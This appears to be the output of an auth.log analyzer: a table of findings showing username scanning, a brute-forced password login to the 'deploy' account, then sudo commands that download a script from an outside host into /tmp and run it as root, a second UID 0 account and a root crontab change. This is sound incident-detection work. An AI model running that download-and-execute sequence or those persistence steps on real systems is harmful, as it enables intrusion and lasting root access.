# auth.log findings

| Time | Severity | Type | Detail |
|---|---|---|---|
| Nov 03 01:00:16 | Info | SCANNING | 203.0.113.133 tried 4 non-existent usernames: admin, git, pi, test |
| Nov 03 01:33:59 | High | SUSPICIOUS_SUDO | ansible ran as root: /usr/bin/cp /tmp/ansible-tmp/nginx.conf /etc/nginx/nginx.conf  (uses a file in a world-writable temp folder) |
| Nov 03 02:11:04 | Info | SCANNING | 198.51.100.77 tried 3 non-existent usernames: admin, deployer, webadmin |
| Nov 03 02:15:19 | Critical | BRUTE_FORCE_SUCCESS | 26 failed logins from 198.51.100.77 then ACCEPTED password for deploy |
| Nov 03 02:15:19 | High | PASSWORD_LOGIN | password login for deploy from external IP 198.51.100.77 (policy: keys only) |
| Nov 03 02:17:34 | High | SUSPICIOUS_SUDO | deploy ran as root: /usr/bin/wget -q http://203.0.113.99/u.sh -O /tmp/.u.sh  (downloads a file from the internet; uses a file in a world-writable temp folder) |
| Nov 03 02:17:46 | High | SUSPICIOUS_SUDO | deploy ran as root: /usr/bin/chmod +x /tmp/.u.sh  (uses a file in a world-writable temp folder; makes a file executable) |
| Nov 03 02:17:51 | High | SUSPICIOUS_SUDO | deploy ran as root: /bin/bash /tmp/.u.sh  (uses a file in a world-writable temp folder) |
| Nov 03 02:17:54 | Critical | UID0_ACCOUNT | new account sysupdate with UID 0 (second root account) |
| Nov 03 02:18:05 | High | CRONTAB_CHANGE | root crontab REPLACE 0 min after suspicious sudo (persistence?) |
| Nov 03 05:30:44 | Info | SCANNING | 203.0.113.136 tried 5 non-existent usernames: admin, git, postgres, test, user |
| Nov 03 07:18:21 | Info | SCANNING | 203.0.113.190 tried 3 non-existent usernames: admin, git, user |
| Nov 03 10:36:58 | Info | SCANNING | 203.0.113.127 tried 3 non-existent usernames: git, oracle, pi |
| Nov 03 15:38:30 | Info | SCANNING | 203.0.113.175 tried 3 non-existent usernames: admin, pi, postgres |
| Nov 03 19:38:16 | Info | SCANNING | 203.0.113.140 tried 3 non-existent usernames: oracle, pi, postgres |
